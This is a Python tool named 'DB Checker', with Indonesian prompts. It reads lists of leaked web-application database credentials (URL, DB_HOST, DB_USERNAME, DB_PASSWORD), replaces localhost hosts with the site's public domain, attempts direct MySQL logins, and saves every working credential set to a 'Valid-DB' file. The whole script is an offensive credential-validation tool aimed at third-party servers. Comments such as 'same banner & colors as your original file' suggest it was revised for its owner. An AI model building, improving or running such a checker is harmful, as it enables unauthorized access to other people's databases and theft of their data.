import os
from urllib.parse import urlparse
from datetime import datetime

import mysql.connector
from mysql.connector import errors as mysql_errors

from pystyle import Write, Colors, Colorate, Center
from colorama import init
init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii():
    banner = r"""
██████╗ ██████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██████╔╝    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║  ██║██╔══██╗    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██████╔╝    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═════╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    # same banner & colors as your original file
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, banner, 1)))
    print()

def _safe_port(v, default=3306):
    if v is None:
        return default
    # tolerate cases like "3306, DB_DATABASE='xxx'"
    s = str(v).strip().strip('"').strip("'")
    # cut at first non-digit
    digits = []
    for ch in s:
        if ch.isdigit():
            digits.append(ch)
        else:
            break
    return int(''.join(digits)) if digits else default

def check_db_connection_direct(data, output_file):
    try:
        url_origin = data.get('URL')
        host = data.get('DB_HOST')
        user = data.get('DB_USERNAME')
        password = data.get('DB_PASSWORD')
        database = data.get('DB_DATABASE')
        port = _safe_port(data.get('DB_PORT', '3306'))

        # keep your localhost → domain swap
        if host in ['127.0.0.1', 'localhost']:
            parsed_url = urlparse(url_origin)
            domain = parsed_url.hostname
            Write.Print(f"🔄 Host awal: {host} → Diganti dengan domain: {domain}\n",
                        Colors.yellow_to_green, interval=0.001)
            host = domain

        Write.Print(f"\n[URL] {url_origin}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"[Host] {host}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"[Port] {port}\n", Colors.blue_to_cyan, interval=0.001)

        # ── Direct MySQL connect ───────────────────────────────────────────────
        conn = mysql.connector.connect(
            host=host, user=user, password=password,
            database=database, port=port,
            connection_timeout=6, autocommit=True
        )
        try:
            cur = conn.cursor()
            cur.execute("SELECT 1")
            cur.fetchone()
        finally:
            cur.close()
            conn.close()
        # ──────────────────────────────────────────────────────────────────────

        Write.Print("✅ Koneksi berhasil - simpan ke Valid-DB\n",
                    Colors.green_to_yellow, interval=0.001)

        # same output format & location as your original main.py
        with open(output_file, 'a', encoding='utf-8') as f_out:
            f_out.write(f"URL: {url_origin}\n")
            f_out.write(f"DB_HOST: {host}\n")
            f_out.write(f"DB_DATABASE: {database}\n")
            f_out.write(f"DB_USERNAME: {user}\n")
            f_out.write(f"DB_PASSWORD: {password}\n\n")
        return True

    except (mysql_errors.InterfaceError, mysql_errors.DatabaseError,
            mysql_errors.ProgrammingError) as e:
        Write.Print(f"❌ Koneksi gagal: {e}\n", Colors.red_to_yellow, interval=0.001)
        return False
    except Exception as e:
        Write.Print(f"❌ Error: {e}\n", Colors.red_to_yellow, interval=0.001)
        return False

def main():
    clear()
    print_ascii()

    # keep EXACT same prompt text and dirs as your original script
    input_file = Write.Input("Masukkan path file list.txt: ", Colors.green_to_yellow, interval=0.005)
    if not os.path.exists(input_file):
        Write.Print("❌ File tidak ditemukan!\n", Colors.red_to_yellow, interval=0.001)
        return

    os.makedirs("Valid-DB", exist_ok=True)
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_file = os.path.join("Valid-DB", f"valid_db_{now}.txt")

    with open(input_file, 'r', encoding='utf-8', errors='replace') as file:
        content = file.read()

    # same block parsing style as original
    blocks = content.strip().split('\n\n')
    valid_count = 0

    for block in blocks:
        lines = block.strip().split('\n')
        data = {}
        for line in lines:
            if ':' not in line:
                continue
            key, value = line.split(':', 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            data[key] = value

        # allow DB_PORT but keep it optional
        if 'DB_PORT' in data and not data['DB_PORT']:
            data['DB_PORT'] = '3306'

        if check_db_connection_direct(data, output_file):
            valid_count += 1

    Write.Print(f"\n✅ Selesai! Valid DB disimpan di: {output_file}\n",
                Colors.green_to_yellow, interval=0.005)
    Write.Print(f"📊 Total valid: {valid_count}\n",
                Colors.green_to_yellow, interval=0.005)

if __name__ == "__main__":
    main()
